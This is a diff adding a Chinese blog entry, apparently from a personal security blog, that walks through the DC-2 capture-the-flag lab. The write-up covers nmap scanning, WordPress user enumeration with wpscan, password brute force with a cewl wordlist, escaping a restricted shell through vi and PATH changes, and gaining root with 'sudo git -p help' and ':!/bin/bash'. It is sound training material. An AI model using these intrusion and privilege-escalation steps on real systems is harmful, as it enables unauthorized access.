@@ -77,6 +77,78 @@
       </tags>
   </entry>
   <entry>
+    <title>DC-2</title>
+    <url>/2022/04/15/DC-2/</url>
+    <content><![CDATA[<p>攻击机：192.168.168.128<br>靶机：靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><p>老规矩上nmap</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/1.png" alt="img"></p>
+<p>发现靶机IP为192.168.168.129</p>
+<h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">namp -sS -p- 192.168.168.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/2.png" alt="img"></p>
+<p>发现开启了端口80<br>还有一个7744，这啥端口啊，对着这个端口再扫一次</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A -p 7744 192.168.168.129</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/2.6.png" alt="img"></p>
+<p>原来是ssh呢，先不管吧<br>浏览192.168.168.129:80</p>
+<p><img src="/2022/04/15/DC-2/2.5.png" alt="img"></p>
+<p>发现flag1</p>
+<p><img src="/2022/04/15/DC-2/3.png" alt="img"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看cms是什么</p>
+<p><img src="/2022/04/15/DC-2/4.png" alt="img"></p>
+<p>好家伙是wordpress，而且还是4.7的<br>用dirsearch看看目录下有什么</p>
+<p><img src="/2022/04/15/DC-2/5.png" alt="img"></p>
+<h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>进入后台吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://dc-2/wp-login.php?redirect_to=http%3A%2F%2F192.168.168.129%2Fwp-admin%2F&amp;reauth=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/6.png" alt="img"></p>
+<p>经典登录框<br>既然是WordPress，那就用wpscan看看有什么用户</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo wpscan --url http://dc-2/ –enumerate u </span><br></pre></td></tr></table></figure>
+
+<p>发现以下三个user</p>
+<p><img src="/2022/04/15/DC-2/7.png" alt="img"></p>
+<p>放到burp上进行爆破看看，结果失败了，看来原字典中没有匹配的。<br>flag1中有说到cewl，那就用cewl生成字典再试试</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cewl http://dc-2/ &gt; dc-2.txt</span><br></pre></td></tr></table></figure>
+
+<p>用生成的dc-2.txt作为字典再跑一次（集束炸弹）</p>
+<p><img src="/2022/04/15/DC-2/8.png" alt="img"></p>
+<p>登录看看</p>
+<p><img src="/2022/04/15/DC-2/9.png" alt="img"></p>
+<p>flag2 get</p>
+<h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>这里让我们找其他突破口，看了这个wordpress没用了<br>试着上传，结果跟我说路径创不了，好吧</p>
+<p>回到之前收集到的7744端口，这就是其他突破口，ssh远程连接<br>这里我用xshell连接</p>
+<p><img src="/2022/04/15/DC-2/10.png" alt="img"></p>
+<p>配好后用刚刚得到的两串账号密码登录看看行不行<br>我用tom的是可以的<br>进去后发现不能用很多命令，存在命令受限问题<br>ls ，vi 能用。<br>ls，发现当前目录存在flag3.txt，用vi查看</p>
+<p><img src="/2022/04/15/DC-2/11.png" alt="img"></p>
+<h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>我这里用了vi绕过受限</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
+
+<p>发现能用cd了<br>看看有什么敏感目录吧<br>最后在&#x2F;home&#x2F;jerryx下发现flag4.txt</p>
+<p><img src="/2022/04/15/DC-2/12.png" alt="img"></p>
+<h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>git提权是吧<br>结果发现git不给用，还是得解决命令受限问题<br>最后找到了这种，rbash绕过<br>参考(<a href="https://xz.aliyun.com/t/7642#toc-3">https://xz.aliyun.com/t/7642#toc-3</a>)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/15/DC-2/13.png" alt="img"></p>
+<p>这里我们要改两个地方，其中是PATH与SHELL</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin/:/usr/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">export</span> SHELL=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就能用其他命令了<br>发现tom不是sudoer，那就切成jerry</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo git -p <span class="built_in">help</span></span><br><span class="line">:!/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>提权成功<br>查看&#x2F;root<br>发现最后的flag</p>
+<p><img src="/2022/04/15/DC-2/14.png" alt="img"></p>
+<p>DC2 clear</p>
+]]></content>
+      <categories>
+        <category>实践</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>竞赛课-WEB5</title>
     <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
     <content><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p>
